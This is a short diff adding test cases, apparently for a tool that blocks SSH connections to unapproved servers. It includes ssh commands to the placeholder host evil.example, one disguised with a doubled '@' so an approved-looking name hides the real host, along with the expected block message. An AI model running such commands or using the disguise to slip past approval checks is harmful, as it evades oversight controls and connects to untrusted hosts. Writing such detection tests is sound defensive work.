@@ -1,0 +1,4 @@
+{"command": "ssh -F none foo@approved@evil.example", "hosts": ["approved@evil.example"], "dynamic": false, "hardblock": [], "policy": null}
+{"command": "coproc ssh -F none evil.example", "hosts": [], "dynamic": false, "hardblock": [], "policy": null}
+{'openssh': ['user foo@approved', 'hostname evil.example']}
+{'submodule_wildcard_policy': 'Error: unsafe code detected (Blocked: SSH library access to unapproved server(s): evil.example. Approve the server when prompted to allow deployment workflows.). Please remove unsafe patterns from your code.'}
